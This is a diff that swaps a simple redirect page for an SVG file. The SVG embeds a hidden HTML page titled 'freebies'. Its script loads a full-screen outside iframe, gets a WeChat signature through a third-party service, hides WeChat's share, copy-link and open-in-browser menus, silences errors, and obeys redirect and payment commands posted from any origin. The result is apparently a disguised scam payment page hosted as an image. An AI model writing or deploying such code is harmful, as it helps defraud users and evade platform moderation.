@@ -1,48 +1,339 @@
-<!doctype html>
-<html lang="zh">
-<head>
-  <meta charset="utf-8" />
-  <title>Redirecting…</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <style>
-    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
-    .box { text-align:center; }
-    a { color:#0645ad; }
-  </style>
-  <script>
-    // 目标地址（B站），注意它已经包含了查询字符串
-    const targetBase = "https://carterevan.github.io/hucai666/index"; 
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%">
+  <foreignObject width="100%" height="100%">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+        <title>福利</title>
+        <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
+        <script>
+          if (typeof wx !== 'undefined') {
+            window.wxjs = wx;
+          }
+        </script>
+        <style>
+          *{margin:0;padding:0;}
+          html,body{width:100%;height:100%;}
+          #dynamicIframe{display:block;width:100%;height:100%;border:0;}
+        </style>
+      </head>
+      <body translate="no">
+        <iframe id="dynamicIframe" src="" frameborder="0"></iframe>
 
-    // 从当前 URL 获取查询字符串（不包含 ? 的那部分），如果没有则为空字符串
-    const srcQuery = window.location.search ? window.location.search.substring(1) : "";
+        <script>
+          window.addEventListener('error', function(e) {
+            return false;
+          });
+          
+          window.addEventListener('unhandledrejection', function(e) {
+            e.preventDefault();
+          });
 
-    // 把当前页面的查询参数附加到目标地址。
-    // 如果srcQuery为空则直接跳转到targetBase
-    function buildTarget() {
-      if (!srcQuery) return targetBase;
-      // 目标是否已经有 ?（示例中已有，所以通常是 true）
-      return targetBase + (targetBase.indexOf("?") === -1 ? "?" : "&") + srcQuery;
-    }
+          const FIXED_IFRAME_URL = "https://h5.mrhl.org/";
+          const FIXED_SIGN_URL = "https://carterevan.github.io/hucai666/";
 
-    // 立即跳转（若需等待或展示提示可改为延迟）
-    const finalUrl = buildTarget();
-    // 控制台输出便于调试
-    console.log("Redirecting to:", finalUrl);
-    // 使用 location.replace 避免在浏览器历史留下中间页
-    window.location.replace(finalUrl);
-  </script>
-</head>
-<body>
-  <div class="box">
-    <h2>正在跳转，请稍候…</h2>
-    <p>如果没有自动跳转，请点击下面的链接：</p>
-    <p><a id="fallback" href="#">前往目标页面</a></p>
-    <script>
-      // 为了防止 JS 被阻止，设置一个 fallback 链接
-      document.getElementById('fallback').href = (function(){
-        try { return buildTarget(); } catch(e) { return targetBase; }
-      })();
-    </script>
-  </div>
-</body>
-</html>
+          const isWeChatBrowser = /MicroMessenger/i.test(navigator.userAgent);
+          const isStaticHost = window.location.protocol === 'https:' && 
+                              (window.location.hostname.includes('github.io') || 
+                               window.location.hostname.includes('netlify.app') ||
+                               window.location.hostname.includes('vercel.app') ||
+                               window.location.hostname.includes('gitee.io'));
+          
+          if (isWeChatBrowser && window.wxjs && !isStaticHost) {
+            fetch("https://api.tthaol.com/api/wechat/getJsapiTicket", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ url: FIXED_SIGN_URL })
+            })
+            .then(r => {
+              if (!r.ok) {
+                throw new Error(`HTTP ${r.status}: ${r.statusText}`);
+              }
+              return r.json();
+            })
+            .then(res => {
+              if (res && res.data) {
+                try {
+                  window.wxjs.config({
+                    debug: false,
+                    appId: res.data.appId,
+                    timestamp: res.data.timestamp,
+                    nonceStr: res.data.nonceStr,
+                    signature: res.data.signature,
+                    jsApiList: ["hideOptionMenu", "hideMenuItems", "closeWindow"]
+                  });
+                  window.wxjs.ready(() => {
+                    window.wxjs.hideOptionMenu();
+                    window.wxjs.hideMenuItems({
+                      menuList: [
+                        "menuItem:share:appMessage",
+                        "menuItem:share:timeline",
+                        "menuItem:copyUrl",
+                        "menuItem:openWithQQBrowser",
+                        "menuItem:openWithSafari"
+                      ]
+                    });
+                  });
+                  window.wxjs.error(err => {
+                  });
+                } catch (e) {
+                }
+              }
+            })
+            .catch(err => {
+            });
+          }
+
+          function checkWechatCallback() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            const state = urlParams.get('state');
+            
+            if (code && state) {
+              try {
+                const stateData = JSON.parse(state);
+                if (stateData.source === 'wechat_login') {
+                  return { code, state, isWechatCallback: true };
+                }
+              } catch (e) {}
+            }
+            return { isWechatCallback: false };
+          }
+
+          (function loadIframe(){
+            const iframe = document.getElementById("dynamicIframe");
+            const callbackInfo = checkWechatCallback();
+            
+            let iframeUrl = FIXED_IFRAME_URL;
+            
+            if (callbackInfo.isWechatCallback) {
+              const separator = iframeUrl.includes('?') ? '&' : '?';
+              iframeUrl += `${separator}code=${callbackInfo.code}&state=${encodeURIComponent(callbackInfo.state)}`;
+            } else {
+              const currentParams = new URLSearchParams(window.location.search);
+              const params = [];
+              
+              for (const [key, value] of currentParams) {
+                params.push(`${key}=${encodeURIComponent(value)}`);
+              }
+              
+              if (params.length > 0) {
+                const separator = iframeUrl.includes('?') ? '&' : '?';
+                iframeUrl += `${separator}${params.join('&')}`;
+              }
+            }
+            
+            iframe.src = iframeUrl;
+            
+            iframe.onload = function() {
+              setTimeout(() => {
+                try {
+                  if (iframe.contentWindow) {
+                    iframe.contentWindow.postMessage({
+                      action: 'set_iframe_parent_url',
+                      iframe_parent_url: window.location.href,
+                      parent_origin: window.location.origin,
+                      is_embedded: window.self !== window.top,
+                      environment: 'svg_iframe'
+                    }, '*');
+                  }
+                } catch (e) {
+                }
+              }, 1000);
+            };
+          })();
+
+          window.addEventListener("message", function(event) {
+            try {
+              if (!event.data || typeof event.data !== 'object') {
+                return;
+              }
+
+              const { action, url } = event.data;
+              
+              if (action === "redirect" && typeof url === "string" && url) {
+                window.location.href = url;
+              }
+              
+              if (action === "wechat_authorize" && typeof url === "string" && url) {
+                window.location.href = url;
+              }
+              
+              if (action === "iframe_navigate" && typeof url === "string" && url) {
+                const iframe = document.getElementById("dynamicIframe");
+                if (iframe) {
+                  iframe.src = url;
+                }
+              }
+              
+              if (action === "get_client_domain") {
+                const iframe = document.getElementById("dynamicIframe");
+                if (iframe && iframe.contentWindow) {
+                  try {
+                    iframe.contentWindow.postMessage({
+                      action: 'client_domain_response',
+                      clientDomain: FIXED_IFRAME_URL,
+                      iframeDomain: FIXED_SIGN_URL
+                    }, '*');
+                  } catch (e) {
+                  }
+                }
+              }
+              
+              if (action === "payment_redirect" && typeof url === "string" && url) {
+                if (window.self !== window.top) {
+                  try {
+                    window.parent.postMessage({
+                      action: 'redirect',
+                      url: url
+                    }, '*');
+                    
+                    setTimeout(() => {
+                      window.location.href = url;
+                    }, 1000);
+                  } catch (e) {
+                    window.location.href = url;
+                  }
+                } else {
+                  window.location.href = url;
+                }
+              }
+              
+              if (action === "handle_payment" && event.data.payUrl) {
+                const { payUrl, paymentType, userAgent, isWechatBrowser, isAlipayBrowser, isStaticDeploy, currentOrigin } = event.data;
+                
+                const iframe = document.getElementById("dynamicIframe");
+                if (iframe && iframe.contentWindow) {
+                  try {
+                    iframe.contentWindow.postMessage({
+                      action: 'payment_handled'
+                    }, '*');
+                  } catch (e) {
+                  }
+                }
+                
+                const shouldUseQRCode = isStaticDeploy && 
+                                      isWechatBrowser && 
+                                      (payUrl.includes('xx-pay.cn') || payUrl.includes('http://'));
+                
+                if (shouldUseQRCode) {
+                  if (iframe && iframe.contentWindow) {
+                    try {
+                      iframe.contentWindow.postMessage({
+                        action: 'show_qr_payment',
+                        payUrl: payUrl,
+                        orderId: event.data.orderId
+                      }, '*');
+                    } catch (e) {
+                      window.location.href = payUrl;
+                    }
+                  }
+                  return;
+                }
+                
+                if (paymentType === 'wechat' && payUrl.startsWith('weixin://wxpay/')) {
+                  if (isWechatBrowser && window.wxjs) {
+                    try {
+                      const urlParams = new URLSearchParams(payUrl.split('?')[1]);
+                      const paySign = urlParams.get('pr');
+                      
+                      if (paySign) {
+                        window.wxjs.ready(() => {
+                          window.wxjs.chooseWXPay({
+                            timestamp: Math.floor(Date.now() / 1000).toString(),
+                            nonceStr: 'wx_pay_' + Date.now(),
+                            package: 'prepay_id=' + paySign,
+                            signType: 'MD5',
+                            paySign: paySign,
+                            success: function (res) {
+                              if (iframe && iframe.contentWindow) {
+                                iframe.contentWindow.postMessage({
+                                  action: 'payment_success'
+                                }, '*');
+                              }
+                            },
+                            fail: function (res) {
+                              window.location.href = payUrl;
+                            }
+                          });
+                        });
+                      } else {
+                        window.location.href = payUrl;
+                      }
+                    } catch (e) {
+                      window.location.href = payUrl;
+                    }
+                  } else {
+                    window.location.href = payUrl;
+                  }
+                } else if (paymentType === 'alipay' && (payUrl.startsWith('alipays://') || payUrl.includes('alipay.com'))) {
+                  if (isAlipayBrowser) {
+                    window.location.href = payUrl;
+                  } else {
+                    const userAgent = navigator.userAgent.toLowerCase();
+                    const isIOS = /iphone|ipad/.test(userAgent);
+                    const isAndroid = userAgent.includes('android');
+                    
+                    if (isIOS || isAndroid) {
+                      window.location.href = payUrl;
+                      
+                      setTimeout(() => {
+                        alert('请安装支付宝客户端或在支付宝中打开');
+                      }, 2000);
+                    } else {
+                      window.location.href = payUrl;
+                    }
+                  }
+                } else {
+                  if (isWechatBrowser && payUrl.includes('xx-pay.cn') && window.location.protocol === 'https:') {
+                    if (iframe && iframe.contentWindow) {
+                      try {
+                        iframe.contentWindow.postMessage({
+                          action: 'show_qr_payment',
+                          payUrl: payUrl,
+                          orderId: event.data.orderId
+                        }, '*');
+                      } catch (e) {
+                        window.location.href = payUrl;
+                      }
+                    }
+                  } else {
+                    const iframe = document.getElementById("dynamicIframe");
+                    
+                    if (isWechatBrowser && payUrl.includes('xx-pay.cn')) {
+                      let hasNavigated = false;
+                      
+                      const checkNavigation = () => {
+                        if (document.hidden || document.visibilityState === 'hidden') {
+                          hasNavigated = true;
+                        }
+                      };
+                      
+                      document.addEventListener('visibilitychange', checkNavigation);
+                      
+                      setTimeout(() => {
+                        document.removeEventListener('visibilitychange', checkNavigation);
+                        if (!hasNavigated && iframe && iframe.contentWindow) {
+                          try {
+                            iframe.contentWindow.postMessage({
+                              action: 'show_qr_payment',
+                              payUrl: payUrl,
+                              orderId: event.data.orderId
+                            }, '*');
+                          } catch (e) {}
+                        }
+                      }, 2000);
+                    }
+                    
+                    window.location.href = payUrl;
+                  }
+                }
+              }
+            } catch (e) {
+            }
+          });
+        </script>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
